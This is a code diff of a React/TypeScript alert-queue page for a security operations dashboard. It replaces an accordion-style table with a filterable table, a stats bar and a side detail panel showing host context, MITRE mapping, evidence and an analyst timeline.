-          </div>
-
-          {/* Table Rows */}
-          {filteredAlerts.map((alert) => {
-            const sev = sevConfig[alert.severity];
-            const isExpanded = expandedId === alert.id;
-
-            return (
-              <div key={alert.id}>
-                {/* Alert Row */}
-                <div
-                  onClick={() => setExpandedId(isExpanded ? null : alert.id)}
-                  className={cn(
-                    "grid grid-cols-[40px_100px_1fr_100px_100px_60px] md:grid-cols-[40px_100px_1fr_100px_100px_120px] border-b border-[#141e34] cursor-pointer transition-colors",
-                    isExpanded ? "bg-[#111c32]" : "hover:bg-[#0f1829]"
-                  )}
-                >
-                  {/* Severity Icon */}
-                  <div className="px-3 py-3 flex items-center">
-                    <span className={sev.dotClass}>{sev.icon}</span>
-                  </div>
-                  {/* Severity Text */}
-                  <div className="px-3 py-3 flex items-center">
-                    <span className={cn("text-xs font-semibold", sev.textClass)}>{alert.severity}</span>
-                  </div>
-                  {/* Date + Title */}
-                  <div className="px-3 py-3 min-w-0">
-                    <div className="text-xs text-neutral-400 mb-0.5">{alert.timestamp}</div>
-                    <div className="text-sm text-neutral-200 truncate">
-                      {alert.id} - {alert.title}
-                    </div>
-                  </div>
-                  {/* Event ID */}
-                  <div className="px-3 py-3 items-center hidden md:flex">
-                    <span className="text-xs text-neutral-500 font-mono">{alert.eventId}</span>
-                  </div>
-                  {/* Type */}
-                  <div className="px-3 py-3 flex items-center">
-                    <span className="text-xs text-neutral-400">{alert.alertType}</span>
-                  </div>
-                  {/* Expand Toggle */}
-                  <div className="px-3 py-3 flex items-center justify-center">
-                    {isExpanded ? (
-                      <ChevronUp className="w-4 h-4 text-neutral-500" />
-                    ) : (
-                      <ChevronDown className="w-4 h-4 text-neutral-600" />
-                    )}
-                  </div>
-                </div>
-
-                {/* ─── Expanded Detail Panel (Accordion) ─── */}
-                {isExpanded && (
-                  <div className="bg-[#0a1020] border-b border-[#1a2540] animate-fade-in">
-                    <div className="p-6">
-                      {/* Title + Status */}
-                      <div className="flex items-start justify-between mb-5">
-                        <div>
-                          <h3 className="text-base font-semibold text-white mb-1">{alert.title}</h3>
-                          <p className="text-sm text-neutral-500 leading-relaxed max-w-3xl">{alert.description}</p>
-                        </div>
-                        <span className={cn("text-xs font-semibold uppercase px-2.5 py-1 rounded border", 
-                          alert.status === "Open" && "border-red-900/40 bg-red-950/30 text-red-400",
-                          alert.status === "Investigating" && "border-yellow-900/40 bg-yellow-950/30 text-yellow-400",
-                          alert.status === "Closed" && "border-neutral-700/40 bg-neutral-900/30 text-neutral-500",
-                        )}>
-                          {alert.status}
-                        </span>
-                      </div>
-
-                      {/* Metadata Grid */}
-                      <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6 p-4 bg-[#0d1526] rounded-lg border border-[#1a2540]">
-                        {[
-                          { label: "Event ID", value: String(alert.eventId), mono: true },
-                          { label: "Event Time", value: alert.timestamp },
-                          { label: "Rule", value: alert.mitreId },
-                          { label: "Source IP", value: alert.sourceIp, mono: true },
-                          { label: "Destination IP", value: alert.destIp, mono: true },
-                          { label: "HTTP Method", value: alert.httpMethod },
-                          { label: "URL", value: alert.url, mono: true },
-                          { label: "User Agent", value: alert.userAgent },
-                        ].map((m) => (
-                          <div key={m.label}>
-                            <span className="text-[10px] text-neutral-600 uppercase tracking-wider block mb-1">{m.label}</span>
-                            <span className={cn("text-xs text-neutral-300 break-all", m.mono && "font-mono")}>{m.value}</span>
-                          </div>
-                        ))}
-                      </div>
-
-                      {/* Alert Trigger Reason */}
-                      <div className="mb-6 p-4 bg-[#0d1526] rounded-lg border border-[#1a2540]">
-                        <h4 className="text-[10px] text-neutral-500 uppercase tracking-wider font-semibold mb-2">Alert Trigger Reason</h4>
-                        <p className="text-sm text-neutral-300 leading-relaxed">{alert.triggerReason}</p>
-                      </div>
-
-                      {/* MITRE ATT&CK */}
-                      <div className="mb-6 p-4 bg-[#0d1526] rounded-lg border border-[#1a2540]">
-                        <h4 className="text-[10px] text-neutral-500 uppercase tracking-wider font-semibold mb-2 flex items-center gap-1.5">
-                          <Shield className="w-3 h-3" /> MITRE ATT&CK Mapping
-                        </h4>
-                        <span className="text-sm text-neutral-300 font-mono">{alert.mitreTechnique}</span>
-                      </div>
-
-                      {/* Related Logs */}
-                      <div className="mb-6 p-4 bg-[#0d1526] rounded-lg border border-[#1a2540]">
-                        <h4 className="text-[10px] text-neutral-500 uppercase tracking-wider font-semibold mb-3">Related Log Entries</h4>
-                        <div className="space-y-1.5">
-                          {alert.relatedLogs.map((log, i) => (
-                            <div key={i} className="px-3 py-2 bg-[#0a1020] rounded border border-[#141e34] text-xs font-mono text-neutral-500 leading-relaxed">
-                              {log}
-                            </div>
-                          ))}
-                        </div>
-                      </div>
-
-                      {/* Raw Log Data */}
-                      <div className="mb-6 p-4 bg-[#0d1526] rounded-lg border border-[#1a2540]">
-                        <h4 className="text-[10px] text-neutral-500 uppercase tracking-wider font-semibold mb-3">Raw Log Data</h4>
-                        <pre className="px-3 py-3 bg-[#080e1a] rounded border border-[#141e34] text-[11px] font-mono text-neutral-600 overflow-x-auto whitespace-pre-wrap break-all leading-relaxed max-h-48">
-                          {JSON.stringify(JSON.parse(alert.rawLog), null, 2)}
-                        </pre>
-                      </div>
-
-                      {/* Investigation Hints */}
-                      <div className="mb-6 p-4 bg-[#101828] rounded-lg border border-[#1e2d4a]">
-                        <h4 className="text-[10px] text-primary/80 uppercase tracking-wider font-semibold mb-3 flex items-center gap-1.5">
-                          💡 Investigation Hints
-                        </h4>
-                        <div className="space-y-2">
-                          {alert.investigationHints.map((hint, i) => (
-                            <div key={i} className="flex gap-2.5">
-                              <span className="text-primary/60 text-xs font-bold mt-0.5 shrink-0">{i + 1}.</span>
-                              <span className="text-xs text-neutral-400 leading-relaxed">{hint}</span>
-                            </div>
-                          ))}
-                        </div>
-                      </div>
-
-                      {/* SOC Analyst Actions */}
-                      <div className="flex flex-wrap gap-2">
-                        <button className="flex items-center gap-2 px-4 py-2 text-xs font-medium rounded-lg bg-primary/10 text-primary border border-primary/20 hover:bg-primary/20 transition-colors">
-                          <Play className="w-3.5 h-3.5" />
-                          Start Investigation
-                        </button>
-                        <button className="flex items-center gap-2 px-4 py-2 text-xs font-medium rounded-lg bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 hover:bg-emerald-500/20 transition-colors">
-                          <ThumbsUp className="w-3.5 h-3.5" />
-                          True Positive
-                        </button>
-                        <button className="flex items-center gap-2 px-4 py-2 text-xs font-medium rounded-lg bg-orange-500/10 text-orange-400 border border-orange-500/20 hover:bg-orange-500/20 transition-colors">
-                          <ThumbsDown className="w-3.5 h-3.5" />
-                          False Positive
-                        </button>
-                        <button className="flex items-center gap-2 px-4 py-2 text-xs font-medium rounded-lg bg-neutral-500/10 text-neutral-400 border border-neutral-500/20 hover:bg-neutral-500/20 transition-colors">
-                          <XCircle className="w-3.5 h-3.5" />
-                          Close Alert
-                        </button>
-                      </div>
-                    </div>
-                  </div>
-                )}
-              </div>
-            );
-          })}
-
-          {filteredAlerts.length === 0 && (
-            <div className="text-center py-16 text-neutral-600 text-sm">
-              No alerts match the current filters.
+      <div className="flex-1 flex flex-col min-w-0">
+        {/* ─── Top Header ─── */}
+        <header className="h-14 px-6 border-b border-white/[0.06] bg-[#0d1117] flex items-center justify-between shrink-0">
+          <div className="flex items-center gap-4">
+            <h1 className="text-base font-semibold text-white tracking-tight">Alert Queue</h1>
+            <div className="flex items-center gap-1.5 px-2 py-0.5 rounded-full bg-green-500/10 border border-green-500/30">
+              <span className="relative flex h-1.5 w-1.5">
+                <span className="absolute inline-flex h-full w-full rounded-full bg-green-500 opacity-75 animate-ping" />
+                <span className="relative inline-flex h-1.5 w-1.5 rounded-full bg-green-500" />
+              </span>
+              <span className="text-[10px] font-medium text-green-400 uppercase tracking-wider">Live</span>
             </div>
-          )}
+          </div>
+          <div className="flex items-center gap-3">
+            <div className="relative">
+              <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-zinc-500" />
+              <input
+                value={search}
+                onChange={(e) => setSearch(e.target.value)}
+                placeholder="Search rule, host, IP, MITRE..."
+                className="w-72 h-8 pl-8 pr-3 text-xs bg-[#161b22] border border-white/[0.08] rounded-md text-zinc-300 placeholder:text-zinc-500 focus:outline-none focus:border-blue-500/50"
+              />
+            </div>
+            <button className="p-1.5 text-zinc-500 hover:text-zinc-300 transition-colors"><RefreshCw className="w-4 h-4" /></button>
+            <button className="relative p-1.5 text-zinc-500 hover:text-zinc-300 transition-colors">
+              <Bell className="w-4 h-4" />
+              <span className="absolute top-1 right-1 w-1.5 h-1.5 bg-red-500 rounded-full" />
+            </button>
+            <div className="w-7 h-7 bg-blue-500/10 border border-blue-500/30 rounded-full flex items-center justify-center text-blue-400">
+              <User className="w-3.5 h-3.5" />
+            </div>
+          </div>
+        </header>
+
+        {/* ─── Stats Bar ─── */}
+        <div className="px-6 py-4 border-b border-white/[0.06] bg-[#0d1117] flex items-center gap-3 shrink-0 overflow-x-auto">
+          <StatCard label="Total Alerts" value={stats.total} accent="text-white" />
+          <StatCard label="Critical" value={stats.critical} accent="text-red-400" dot="bg-red-500" />
+          <StatCard label="High" value={stats.high} accent="text-yellow-400" dot="bg-yellow-500" />
+          <StatCard label="Medium" value={stats.medium} accent="text-orange-400" dot="bg-orange-500" />
+          <StatCard label="Low" value={stats.low} accent="text-green-400" dot="bg-green-500" />
+          <div className="flex-1" />
+          <StatCard label="MTTR" value="00:14:22" accent="text-blue-400" suffix="avg" />
+          <StatCard label="MTTD" value="00:02:48" accent="text-cyan-400" suffix="avg" />
         </div>
-      </div>
+
+        {/* ─── Filter Bar ─── */}
+        <div className="px-6 py-2.5 border-b border-white/[0.06] bg-[#0d1117] flex items-center gap-2 shrink-0">
+          {(["All", "Critical", "High", "Medium", "Low"] as const).map(s => (
+            <button
+              key={s}
+              onClick={() => setSevFilter(s)}
+              className={cn(
+                "px-2.5 py-1 text-[11px] font-medium rounded border transition-colors",
+                sevFilter === s
+                  ? "bg-white/[0.06] text-white border-white/20"
+                  : "bg-transparent text-zinc-500 border-white/[0.08] hover:text-zinc-300 hover:border-white/15"
+              )}
+            >
+              {s}
+            </button>
+          ))}
+          <span className="ml-auto text-[11px] text-zinc-500">
+            {filtered.length} of {alertsData.length} alerts · {checked.size} selected
+          </span>
+        </div>
+
+        {/* ─── Body: Table + Detail Panel ─── */}
+        <div className="flex-1 flex min-h-0">
+          {/* Table */}
+          <div className="flex-1 overflow-auto">
+            <table className="w-full text-xs">
+              <thead className="sticky top-0 bg-[#161b22] z-10 border-b border-white/[0.08]">
+                <tr className="text-left text-[10px] uppercase tracking-wider text-zinc-500">
+                  <th className="w-8 px-3 py-2.5"></th>
+                  <th className="px-2 py-2.5 font-medium">Rule ID</th>
+                  <th className="px-2 py-2.5 font-medium">Severity</th>
+                  <th className="px-2 py-2.5 font-medium">Status</th>
+                  <th className="px-2 py-2.5 font-medium">Alert / Host</th>
+                  <th className="px-2 py-2.5 font-medium">MITRE</th>
+                  <th className="px-2 py-2.5 font-medium">Source IP</th>
+                  <th className="px-2 py-2.5 font-medium">Time</th>
+                  <th className="w-10 px-2 py-2.5"></th>
+                </tr>
+              </thead>
+              <tbody>
+                {filtered.map((a) => {
+                  const isSelected = selected?.id === a.id;
+                  return (
+                    <tr
+                      key={a.id}
+                      onClick={() => setSelected(a)}
+                      className={cn(
+                        "border-b border-white/[0.04] cursor-pointer transition-colors border-l-2",
+                        sevBorder[a.severity],
+                        isSelected ? "bg-blue-500/[0.07]" : "hover:bg-white/[0.025]"
+                      )}
+                    >
+                      <td className="px-3 py-2.5" onClick={(e) => e.stopPropagation()}>
+                        <input
+                          type="checkbox"
+                          checked={checked.has(a.id)}
+                          onChange={() => toggleCheck(a.id)}
+                          className="w-3.5 h-3.5 accent-blue-500 bg-transparent"
+                        />
+                      </td>
+                      <td className="px-2 py-2.5 font-mono text-[11px] text-zinc-400">{a.id}</td>
+                      <td className="px-2 py-2.5">
+                        <span className={cn("inline-flex items-center px-1.5 py-0.5 text-[10px] font-semibold rounded border uppercase tracking-wide", sevBadge[a.severity])}>
+                          {a.severity}
+                        </span>
+                      </td>
+                      <td className="px-2 py-2.5">
+                        <span className={cn("inline-flex items-center px-1.5 py-0.5 text-[10px] font-medium rounded border", statusBadge[a.status])}>
+                          {a.status}
+                        </span>
+                      </td>
+                      <td className="px-2 py-2.5">
+                        <div className="text-zinc-200 font-medium leading-tight">{a.name}</div>
+                        <div className="text-[10px] text-zinc-500 font-mono mt-0.5">{a.hostname}</div>
+                      </td>
+                      <td className="px-2 py-2.5">
+                        <div className="font-mono text-[11px] text-blue-400">{a.mitreId}</div>
+                        <div className="text-[10px] text-zinc-500">{a.mitreName}</div>
+                      </td>
+                      <td className="px-2 py-2.5 font-mono text-[11px] text-zinc-400">{a.sourceIp}</td>
+                      <td className="px-2 py-2.5 font-mono text-[11px] text-zinc-500">{a.time}</td>
+                      <td className="px-2 py-2.5">
+                        <button className="px-2 py-1 text-[10px] font-medium text-blue-400 hover:bg-blue-500/10 rounded border border-blue-500/30 transition-colors">
+                          Triage
+                        </button>
+                      </td>
+                    </tr>
+                  );
+                })}
+              </tbody>
+            </table>
+          </div>
+
+          {/* Detail Panel */}
+          {selected && <DetailPanel alert={selected} onClose={() => setSelected(null)} />}
+        </div>
       </div>
     </div>
   );
 };
+
+// ── Sub-components ─────────────────────────────────────────────
+const StatCard = ({ label, value, accent, dot, suffix }: { label: string; value: string | number; accent: string; dot?: string; suffix?: string }) => (
+  <div className="bg-[#161b22] border border-white/[0.06] rounded-md px-3.5 py-2 min-w-[110px]">
+    <div className="flex items-center gap-1.5 text-[10px] text-zinc-500 uppercase tracking-wider font-medium">
+      {dot && <span className={cn("w-1.5 h-1.5 rounded-full", dot)} />}
+      {label}
+    </div>
+    <div className={cn("text-lg font-semibold font-mono mt-0.5", accent)}>
+      {value}
+      {suffix && <span className="text-[10px] text-zinc-500 font-sans font-normal ml-1">{suffix}</span>}
+    </div>
+  </div>
+);
+
+const DetailPanel = ({ alert, onClose }: { alert: Alert; onClose: () => void }) => (
+  <aside className="w-[420px] shrink-0 border-l border-white/[0.08] bg-[#0d1117] flex flex-col overflow-hidden">
+    {/* Header */}
+    <div className="px-5 py-4 border-b border-white/[0.08]">
+      <div className="flex items-start justify-between gap-3">
+        <div className="min-w-0">
+          <div className="flex items-center gap-2 mb-1.5">
+            <span className={cn("inline-flex items-center px-1.5 py-0.5 text-[10px] font-semibold rounded border uppercase", sevBadge[alert.severity])}>
+              {alert.severity}
+            </span>
+            <span className={cn("inline-flex items-center px-1.5 py-0.5 text-[10px] font-medium rounded border", statusBadge[alert.status])}>
+              {alert.status}
+            </span>
+            <span className="font-mono text-[10px] text-zinc-500">{alert.id}</span>
+          </div>
+          <h2 className="text-sm font-semibold text-white leading-snug">{alert.name}</h2>
+        </div>
+        <button onClick={onClose} className="text-zinc-500 hover:text-zinc-300 transition-colors p-1 -m-1">
+          <X className="w-4 h-4" />
+        </button>
+      </div>
+    </div>
+
+    <div className="flex-1 overflow-auto">
+      {/* Host Context */}
+      <Section title="Host Context" icon={<Cpu className="w-3.5 h-3.5" />}>
+        <KV k="Hostname" v={alert.hostname} mono />
+        <KV k="Source IP" v={alert.sourceIp} mono />
+        <KV k="Destination IP" v={alert.destIp} mono />
+        <KV k="User" v={alert.user} mono />
+        <KV k="OS" v={alert.os} />
+        <KV k="EDR Status" v={
+          <span className="inline-flex items-center gap-1.5 text-green-400">
+            <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse" />
+            {alert.edrStatus}
+          </span>
+        } />
+      </Section>
+
+      {/* MITRE */}
+      <Section title="MITRE ATT&CK" icon={<ShieldAlert className="w-3.5 h-3.5" />}>
+        <div className="bg-[#161b22] border border-white/[0.06] rounded p-2.5">
+          <div className="flex items-center gap-2 mb-1">
+            <span className="font-mono text-[11px] font-semibold text-blue-400">{alert.mitreId}</span>
+            <ChevronRight className="w-3 h-3 text-zinc-600" />
+            <span className="text-[11px] text-zinc-300">{alert.mitreName}</span>
+          </div>
+          <div className="text-[10px] text-zinc-500">Tactic: Execution · Defense Evasion</div>
+        </div>
+      </Section>
+
+      {/* Evidence */}
+      <Section title="Raw Evidence" icon={<FileText className="w-3.5 h-3.5" />}>
+        <pre className="bg-[#010409] border border-white/[0.06] rounded p-2.5 text-[10.5px] font-mono text-zinc-300 leading-relaxed overflow-x-auto whitespace-pre-wrap break-all max-h-48 overflow-y-auto">
+          {alert.evidence}
+        </pre>
+      </Section>
+
+      {/* Timeline */}
+      <Section title="Analyst Timeline" icon={<Clock className="w-3.5 h-3.5" />}>
+        <ol className="space-y-2 relative pl-4 border-l border-white/[0.08] ml-1">
+          {alert.timeline.map((t, i) => (
+            <li key={i} className="relative">
+              <span className="absolute -left-[18px] top-1 w-2 h-2 rounded-full bg-blue-500 ring-2 ring-[#0d1117]" />
+              <div className="text-[10px] text-zinc-500 font-mono">{t.time} · {t.analyst}</div>
+              <div className="text-[11px] text-zinc-300 mt-0.5">{t.action}</div>
+            </li>
+          ))}
+        </ol>
+      </Section>
+    </div>
+
+    {/* Action Bar */}
+    <div className="border-t border-white/[0.08] p-3 grid grid-cols-2 gap-2 shrink-0 bg-[#0d1117]">
+      <ActionBtn icon={<Activity className="w-3.5 h-3.5" />} label="Escalate to IR" variant="primary" />
+      <ActionBtn icon={<FileText className="w-3.5 h-3.5" />} label="Add Note" />
+      <ActionBtn icon={<Ban className="w-3.5 h-3.5" />} label="Isolate Host" variant="danger" />
+      <ActionBtn icon={<ThumbsDown className="w-3.5 h-3.5" />} label="False Positive" />
+    </div>
+  </aside>
+);
+
+const Section = ({ title, icon, children }: { title: string; icon: React.ReactNode; children: React.ReactNode }) => (
+  <div className="px-5 py-3.5 border-b border-white/[0.06]">
+    <div className="flex items-center gap-1.5 text-[10px] uppercase tracking-wider text-zinc-500 font-medium mb-2.5">
+      {icon}
+      {title}
+    </div>
+    <div className="space-y-1.5">{children}</div>
+  </div>
+);
+
+const KV = ({ k, v, mono }: { k: string; v: React.ReactNode; mono?: boolean }) => (
+  <div className="flex items-start justify-between gap-3 text-[11px]">
+    <span className="text-zinc-500 shrink-0">{k}</span>
+    <span className={cn("text-zinc-200 text-right", mono && "font-mono text-[10.5px]")}>{v}</span>
+  </div>
+);
+
+const ActionBtn = ({ icon, label, variant }: { icon: React.ReactNode; label: string; variant?: "primary" | "danger" }) => (
+  <button className={cn(
+    "flex items-center justify-center gap-1.5 px-2 py-2 text-[11px] font-medium rounded border transition-colors",
+    variant === "primary" && "bg-blue-500/15 text-blue-400 border-blue-500/30 hover:bg-blue-500/25",
+    variant === "danger" && "bg-red-500/10 text-red-400 border-red-500/30 hover:bg-red-500/20",
+    !variant && "bg-[#161b22] text-zinc-300 border-white/[0.08] hover:border-white/20"
+  )}>
+    {icon}
+    {label}
+  </button>
+);
 
 export default Alerts;
